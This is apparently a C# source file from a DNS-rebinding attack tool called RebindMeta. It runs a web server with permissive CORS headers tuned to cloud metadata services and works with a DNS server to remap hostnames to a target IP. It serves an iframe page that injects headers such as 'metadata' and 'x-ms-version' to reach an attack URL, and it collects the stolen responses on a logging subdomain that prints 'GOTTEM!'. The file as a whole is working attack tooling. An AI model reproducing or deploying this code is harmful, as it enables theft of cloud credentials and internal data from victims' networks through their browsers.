using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Extensions;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.FileProviders;
using Microsoft.Extensions.Hosting;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Web;

namespace RebindMeta
{
	public class RebindWebServer
	{
		private readonly IWebHost _webServer;
		private readonly bool _shouldInitialLog;
		private readonly string _logHostname;
		private readonly string _htmlTemplate;
		private readonly RebindDnsServer _dnsServer;
		private readonly Dictionary<string, RebindTarget> _rebinds;
		public RebindWebServer(RebindDnsServer dnsServer, string bindIp, int[] bindPorts, bool shouldInitialLog = false)
		{
			_shouldInitialLog = shouldInitialLog;
			_webServer = new WebHostBuilder()
							.UseKestrel()
							.Configure(app => app.Run(GetHttpResponse))
							.UseUrls(bindPorts.Select(x => $"http://{bindIp}:{x}").ToArray())
							.Build();
			_htmlTemplate = ReadEmbeddedFile("Http.RebindPage.html");
			_dnsServer = dnsServer;
			_logHostname = _dnsServer.GetSubdomain("logzz");
			_rebinds = new Dictionary<string, RebindTarget>();
		}

		public Task RunAsync() => _webServer.RunAsync();

		public void AddRebindTarget(string host, RebindTarget target)
			=> _rebinds.Add(host, target);

		private string last = "";

		private async Task GetHttpResponse(HttpContext context)
		{
			context.Response.Headers.Add("Access-Control-Allow-Origin", "*");
			context.Response.Headers.Add("Access-Control-Allow-Headers", "metadata,x-ms-version,x-ms-agent-name");
			context.Response.Headers.Add("Access-Control-Allow-Methods", "GET,HEAD,OPTIONS,POST,PUT");
			context.Response.Headers.Add("Access-Control-Expose-Headers", "access-control-allow-origin,access-control-allow-methods,access-control-allow-headers");
			context.Response.Headers.Add("Connection", "close");

			string host = context.Request.Host.Host.ToLower();

			if (_logHostname.Equals(host, StringComparison.OrdinalIgnoreCase))
			{
				await ProcessLogRequest(context);
				return;
			}

			if (!_rebinds.TryGetValue(host, out RebindTarget target))
			{
				// Drop the request, no rebind setup
				Logger.WriteLine($"Dropping request '{host}', no rebind set");
				return;
			}

			string status = "Dupe";

			if (!_dnsServer.CheckRemap(host))
			{
				_dnsServer.AddRemap(host, target.RebindIP);
				status = "Rebinding";
				last = "";
			}

			string id = context.Request.Method + context.Request.GetEncodedUrl();
			if (status == "Dupe" && last == id)
			{
				Logger.Write(".");
			}
			else
			{
				Logger.WriteLine(status + " " + host + " (" + context.Request.Method + " " + context.Request.GetEncodedPathAndQuery() + ")");
				last = id;
			}

			if (context.Request.Path.Value.EndsWith("iframe", StringComparison.OrdinalIgnoreCase))
			{
				await context.Response.WriteAsync(BuildIFrame(target.Path, target.Headers));
			}
			else
			{
				await context.Response.WriteAsync("{}");
			}
		}

		private async Task ProcessLogRequest(HttpContext context)
		{
			Logger.WriteLine("Log (" + context.Request.Method + "): ------------------");
			Logger.Write(string.Join('\n', context.Request.QueryString.Value.Split('?', '&').Select(x => HttpUtility.UrlDecode(x))) + "\n");
			using (var reader = new StreamReader(context.Request.Body))
			{
				var body = reader.ReadToEnd();
				Logger.Write(body + "\n");
				if (body.IndexOf("NETWORK_ERR") < 0)
				{
					Logger.WriteLine("End Log, GOTTEM!");
				}
			}
			Logger.WriteLine("End Log ------------------"); ;

			await context.Response.WriteAsync("{}");
		}

		private static string ReadEmbeddedFile(string filename)
		{
			EmbeddedFileProvider embeddedProvider = new EmbeddedFileProvider(Assembly.GetExecutingAssembly());
			using Stream stream = embeddedProvider.GetFileInfo(filename).CreateReadStream();
			using StreamReader streamReader = new StreamReader(stream);
			return streamReader.ReadToEnd();
		}

		private string BuildIFrame(string attackUrl, Dictionary<string, string> headers)
			=> _htmlTemplate.Replace("{{{LogHostname}}}", _logHostname)
							.Replace("{{{HeaderInjection}}}", string.Join("\n", headers.Select(x => $"x1.setRequestHeader('{x.Key}','{x.Value}');")))
							.Replace("{{{AttackUrl}}}", "/" + attackUrl.TrimStart('/'))
							.Replace("{{{InitialLog}}}", _shouldInitialLog ? "1" : "0");
	}
}